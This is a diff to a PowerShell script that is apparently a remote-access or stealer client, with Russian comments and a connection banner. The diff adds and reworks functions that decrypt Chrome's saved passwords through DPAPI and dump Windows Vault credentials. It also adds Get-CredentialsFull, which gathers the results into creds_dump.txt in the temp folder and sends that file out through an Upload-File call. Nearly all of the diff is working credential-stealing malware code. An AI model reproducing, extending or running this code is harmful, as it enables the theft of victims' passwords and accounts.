@@ -396,97 +396,23 @@ function PortSuggest {
 
 
 
-function Decrypt-ChromePasswords {
-    $localState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
-    $loginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
-
-    if (!(Test-Path $loginData) -or !(Test-Path $localState)) {
-        return "[INFO] Chrome login data or local state not found"
-    }
-
-    # Извлекаем ключ (base64 -> DPAPI зашифрован)
-    $localStateContent = Get-Content $localState -Raw
-    $encryptedKey = ($localStateContent | ConvertFrom-Json).os_crypt.encrypted_key
-    $encryptedKey = [Convert]::FromBase64String($encryptedKey) | Select-Object -Skip 5  # пропуск "DPAPI"
-    $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, 'CurrentUser')
-
-    # Подключаем SQLite и читаем Login Data
-    $tempDB = "$env:TEMP\chrome_logins.db"
-    Copy-Item $loginData $tempDB -Force
-    $conn = New-Object -ComObject ADODB.Connection
-    $conn.Open("Provider=Microsoft.Jet.OLEDB.4.0;Data Source=$tempDB")
-
-    $cmd = New-Object -ComObject ADODB.Command
-    $cmd.ActiveConnection = $conn
-    $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
-    $rs = $cmd.Execute()
-
-    $results = ""
-
-    while (!$rs.EOF) {
-        $url = $rs.Fields.Item("origin_url").Value
-        $username = $rs.Fields.Item("username_value").Value
-        $encPass = $rs.Fields.Item("password_value").Value
-        $pass = ""
-
-        if ($encPass) {
-            try {
-                $encPass = $encPass[15..($encPass.Length - 1)] # Skip "v10" or "v11"
-                $pass = [System.Text.Encoding]::UTF8.GetString(
-                    [System.Security.Cryptography.ProtectedData]::Unprotect($encPass, $null, 'CurrentUser')
-                )
-            } catch {
-                $pass = "[Decrypt Failed]"
-            }
-        }
-
-        $results += "`n[$url] $username / $pass"
-        $rs.MoveNext()
-    }
-
-    $conn.Close()
-    Remove-Item $tempDB -Force
-    return $results
-}
-
-
-
-
-
-function Dump-WindowsVault {
-    Add-Type -AssemblyName System.Security
-    $vault = New-Object -ComObject "VaultCli.Vault"
-    $items = $vault.GetVaults() | ForEach-Object {
-        $_.GetItems() | ForEach-Object {
-            try {
-                $user = $_.Credential.UserName
-                $pass = $_.Credential.Password
-                "[VAULT] $user / $pass"
-            } catch {}
-        }
-    }
-    return ($items -join "`n")
-}
-
-
-
 function Get-Credentials {
     try {
         $output = ""
 
-        # 1. Windows Credential Manager (список целей)
+        # Windows Credential Manager (только цели)
         $creds = cmdkey /list | Select-String "Target:" | ForEach-Object {
             $target = $_.ToString().Split(":")[1].Trim()
             $output += "`n[TARGET] $target"
         }
 
-        # 2. Chrome логины (только путь)
+        # Chrome Login Data путь
         $chromeLoginPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
         if (Test-Path $chromeLoginPath) {
             $output += "`n[+] Chrome login database found: $chromeLoginPath"
         }
 
-        # 3. Firefox профили
+        # Firefox профили
         $firefoxProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -ErrorAction SilentlyContinue
         foreach ($profile in $firefoxProfiles) {
             $output += "`n[+] Firefox profile: $($profile.FullName)"
@@ -502,18 +428,104 @@ function Get-Credentials {
         return "[ERROR] Credential extraction failed: $($_.Exception.Message)"
     }
 }
-    function Get-CredentialsFull {
-    $output = "`n[*] Windows Credential Manager:`n"
-    $output += (Get-Credentials)
+function Decrypt-ChromePasswords {
+    try {
+        $localState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
+        $loginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
 
-    $output += "`n[*] Chrome Stored Logins:`n"
-    $output += (Decrypt-ChromePasswords)
+        if (!(Test-Path $loginData) -or !(Test-Path $localState)) {
+            return "[INFO] Chrome login data or local state not found"
+        }
 
-    $output += "`n[*] Windows Vault:`n"
-    $output += (Dump-WindowsVault)
+        # Расшифровка ключа
+        $localStateContent = Get-Content $localState -Raw
+        $encryptedKey = ($localStateContent | ConvertFrom-Json).os_crypt.encrypted_key
+        $encryptedKey = [Convert]::FromBase64String($encryptedKey) | Select-Object -Skip 5
+        $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, 'CurrentUser')
 
-    return $output
+        # Копия базы данных
+        $tempDB = "$env:TEMP\chrome_logins.db"
+        Copy-Item $loginData $tempDB -Force
+
+        $conn = New-Object -ComObject ADODB.Connection
+        $conn.Open("Provider=Microsoft.Jet.OLEDB.4.0;Data Source=$tempDB")
+        $cmd = New-Object -ComObject ADODB.Command
+        $cmd.ActiveConnection = $conn
+        $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
+        $rs = $cmd.Execute()
+
+        $results = ""
+        while (!$rs.EOF) {
+            $url = $rs.Fields.Item("origin_url").Value
+            $username = $rs.Fields.Item("username_value").Value
+            $encPass = $rs.Fields.Item("password_value").Value
+            $pass = ""
+
+            if ($encPass) {
+                try {
+                    $encPass = $encPass[15..($encPass.Length - 1)] # пропускаем "v10"
+                    $pass = [System.Text.Encoding]::UTF8.GetString(
+                        [System.Security.Cryptography.ProtectedData]::Unprotect($encPass, $null, 'CurrentUser')
+                    )
+                } catch {
+                    $pass = "[Decrypt Failed]"
+                }
+            }
+
+            $results += "`n[$url] $username / $pass"
+            $rs.MoveNext()
+        }
+
+        $conn.Close()
+        Remove-Item $tempDB -Force
+        return $results
+    }
+    catch {
+        return "[ERROR] Chrome decrypt failed: $($_.Exception.Message)"
+    }
 }
+function Dump-WindowsVault {
+    try {
+        Add-Type -AssemblyName System.Security
+        $vault = New-Object -ComObject "VaultCli.Vault"
+        $items = $vault.GetVaults() | ForEach-Object {
+            $_.GetItems() | ForEach-Object {
+                try {
+                    $user = $_.Credential.UserName
+                    $pass = $_.Credential.Password
+                    "[VAULT] $user / $pass"
+                } catch {}
+            }
+        }
+        return ($items -join "`n")
+    }
+    catch {
+        return "[INFO] Vault access failed or not available on this system."
+    }
+}
+function Get-CredentialsFull {
+    try {
+        $tempPath = "$env:TEMP\creds_dump.txt"
+        $output = "`n[*] Windows Credential Manager:`n"
+        $output += (Get-Credentials)
+
+        $output += "`n[*] Chrome Stored Logins:`n"
+        $output += (Decrypt-ChromePasswords)
+
+        $output += "`n[*] Windows Vault:`n"
+        $output += (Dump-WindowsVault)
+
+        # Сохраняем всё в файл
+        $output | Out-File -FilePath $tempPath -Encoding UTF8 -Force
+
+        # Отправляем
+        return Upload-File $tempPath
+    }
+    catch {
+        return "[ERROR] Credential dump failed: $($_.Exception.Message)"
+    }
+}
+
 
 
 
@@ -751,7 +763,7 @@ ________  ___  ________  ________      ________  ________
     /  /_/__\ \  \ \  \___|\ \  \\\  \ __\ \  \|\  \ \  \_\\ \ 
    |\________\ \__\ \__\    \ \_______\\__\ \_______\ \_______\
     \|_______|\|__|\|__|     \|_______\|__|\|_______|\|_______|  
-                                            TEST 55                                                                                                                                                                    
+                                            TEST 555                                                                                                                                                                    
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
